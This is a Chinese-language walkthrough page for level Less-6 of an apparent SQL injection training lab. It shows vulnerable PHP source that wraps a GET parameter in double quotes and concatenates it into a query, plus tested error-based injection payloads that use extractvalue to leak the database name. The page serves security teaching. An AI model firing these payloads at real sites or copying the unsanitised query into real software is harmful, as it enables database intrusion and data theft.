# Less-6

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错盲注 |
| **闭合方式** | `"` |
| **成败信号** | You are in / SQL 报错 |
| **一句话** | 同上，双引号闭合 |
| **核心 payload** | `?id=1" and extractvalue(1,concat(0x7e,database()))--+` |

---

**GET · 报错型盲注 · 双引号**

### 源码

```php
$id = $_GET['id'];
$id = '"' . $id . '"';                               // 套双引号
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

结构上等于 Less-5 换成双引号版。闭合用 **`"`**。

### 通关 payload（实测）

```
?id=1"                          →  报错 near '"1"" LIMIT 0,1'
?id=1" --+                      →  You are in...........
?id=-1" union select 1,2,3--+   →  You are in...........（依旧不回显）
?id=1" and extractvalue(1,concat(0x7e,database()))--+
→ XPATH syntax error: '~security'
```

---

[← Less-5](Less-05.md) ｜ [返回目录](README.md) ｜ [Less-7 →](Less-07.md)